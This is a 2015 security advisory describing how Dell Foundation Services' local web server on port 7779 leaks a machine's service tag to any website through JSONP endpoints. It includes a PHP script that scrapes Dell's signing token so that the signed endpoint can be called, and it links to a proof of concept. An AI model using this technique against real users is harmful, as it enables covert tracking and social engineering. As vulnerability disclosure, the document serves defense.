---
layout: post
title: "Security Advisory: Dell Foundation Services Remote Information Disclosure"
date: 2015-11-25
categories:
---

*By slipstream/RoL.*

# Overview

Dell Foundation Services (otherwise known by its internal name of "Tribbles") "provides a core set of foundational services facilitating customer serviceability, messaging and support functions".

An issue in Dell Foundation Services, version 2.3.3800.0A00 and below, can be exploited by a malicious website to leak the Dell service tag of a Dell system, which can be used for tracking purposes, or for social engineering.

# Issues

Dell Foundation Services starts a HTTPd that listens on port 7779. Generally, requests to the API exposed by this HTTPd must be requests signed using a RSA-1024 key and hashed with SHA512.

One of the JSONP API endpoints to obtain the service tag does not need a valid signature to be provided; thus, any website can call it.

This endpoint is a part of eDell however, and this part of Tribbles gets removed with the tool and instructions to remove the eDellRoot certificate.

However, another JSONP API endpoint exists to obtain the service tag. This endpoint requires a valid signature, but this signature is provided in the JavaScript on several pages of dell.com, and thus can be scraped.

A proof-of-concept to exploit these issues is available at [here](http://rol.im/dell/) and you can view the source of that page to obtain almost all of the required technical information needed to exploit.

The missing piece is getrequest.php, which scrapes Dell's site to obtain the needed information to call the second JSONP API endpoint:

````
<?php

$f = file_get_contents("http://www.dell.com/support/home/us/en/04");

$signature = array_shift(explode("';",array_pop(explode("var dfsSignatureToken = '",$f))));
$expires = array_shift(explode("';",array_pop(explode("var tokenExpires = '",$f))));
$interface = array_shift(explode("';",array_pop(explode("var dfsInterfaceApi = '",$f))));
$url = array_shift(explode("';",array_pop(explode("var DFSUrl = '",$f))));

echo json_encode( (object) array(
	"signature"=>$signature,
	"expires"=>$expires,
	"interface"=>$interface,
	"url"=>$url
));
````

# Affected Versions

2.3.3800.0A00 and below.

# Solution

Uninstallation of Dell Foundation Services will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.
